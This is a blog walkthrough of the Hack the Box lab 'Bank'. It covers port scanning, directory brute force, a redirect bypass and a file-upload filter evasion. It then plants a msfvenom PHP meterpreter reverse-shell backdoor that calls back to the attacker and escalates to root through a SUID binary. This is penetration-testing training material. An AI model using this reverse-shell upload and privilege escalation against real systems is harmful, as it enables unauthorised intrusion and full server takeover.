@@ -1,0 +1,325 @@
+
+								
+																		Hack the Box Challenge: Bank Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 6, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Bank” which is categories as retired lab presented by Hack the Box for making online penetration practices. Solving challenges in this lab is not that much tough until you don’t have the correct knowledge of Penetration testing. Let start and learn how to breach a network then exploit it for retrieving desired information.
+Level: Intermediate
+Task: find user.txt and root.txt file on the victim’s machine.
+Since these labs are online accessible therefore they have static IP. The IP of Bank is 10.10.10.29 so let’s initiate with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.29
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.29
+					
+				
+			
+		
+
+From given below image, you can observe we found ports 22, 53 and 80 are open in victim’s network. As you have seen in our all previous lab that we love to explore target IP via port 80 on our web browser, similarly we follow that tradition in this also but Bad Luck!! this time it didn’t work at all.
+
+Now the last option was to add target IP inside /etc/host file since port 53 was open for the domain and as it is a challenge of hack the box thus I edit bank.htb as a domain name.
+
+Then I explore the domain name: bank.htb through the web browser and found following login page as shown below.
+
+Then I preferred to use dirbuster tool and chose directory list 2-3 medium.txt file for directory brute force attack on http://bank.htb for PHP file extension.
+
+Here I found so many directories but I was interested in the support.php file. So when I try to explore http://bank.htb/support.php I was unable to access this web page as I was always redirected to login page due to HTTP response 302.
+
+So I installed the noredirect plugin from firefox that allows me to stop any 302 redirections. I simply added http://bank.htb/login.php to the noredirect plugin so it can stop redirecting to /login.php consistently.
+
+So now I’m able to access the exact support.php page where I saw an upload option for uploading a PHP file hence we can try to upload a PHP backdoor instead of a genuine PHP file.
+
+Using msfvenom we had created a malicious shell.php file by executing following command.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw
+					
+				
+			
+		
+
+Simultaneously run multi/handler for reverse connection of the victim’s system.
+
+Then with the title shell, I upload shell.php by adding “ignite” in the message box and click on submit. But failed to upload this file therefore without wasting time I simply intercept our browser HTTP request in Burpsuite.
+
+From given below image you can observe that we had fetched intercepted HTTP request of the uploaded shell.php file.
+
+After so many attempts I simply modify shell.php into shell.htb and forward the intercepted data.
+
+YES!! It successfully gets uploaded, then I run this file and move back to the Metasploit framework for the meterpreter session.
+
+After executing uploaded backdoor file come back to the Metasploit framework and wait for the meterpreter session.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.6
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 10.10.14.6msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe meterpreter session1 opened for accessing victim tty shell.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt;sysinfo
+			
+				
+					
+				
+					1
+				
+						meterpreter&gt;sysinfo
+					
+				
+			
+		
+
+
+Now let’s finish the task by grabbing user.txt and root.txt file. First I move into /home directory and check available files and directories inside it.
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+			
+				
+					
+				
+					12
+				
+						cd /homels
+					
+				
+			
+		
+
+Here one directory chris, when I explore /home/chris I saw user.txt and use cat command for reading.
+
+		
+		
+			
+			
+			
+			
+cd chris
+ls
+cat user.txt
+			
+				
+					
+				
+					123
+				
+						cd chrislscat user.txt
+					
+				
+			
+		
+
+Great!!  Here we had completed 1st task now move to 2nd tasK
+
+Inside /var/www/bank/uploads directory I checkout root privileges directory by executing following command.
+
+		
+		
+			
+			
+			
+			
+find / -perm -4000 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm -4000 2&gt;/dev/null
+					
+				
+			
+		
+
+As result, it dumps so many directories have root privileges but I look at /var/htb/bin/emergency.
+
+When I extract all directory here I found an emergency file which I had run for getting root access as shown below in the image.
+
+		
+		
+			
+			
+			
+			
+./emergency
+id
+			
+				
+					
+				
+					12
+				
+						./emergencyid
+					
+				
+			
+		
+
+
+Now let’s get the root.txt by executing the following command.
+
+		
+		
+			
+			
+			
+			
+cd /root
+cat root.txt
+			
+				
+					
+				
+					12
+				
+						cd /rootcat root.txt
+					
+				
+			
+		
+
+We have successfully completed 2nd task.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
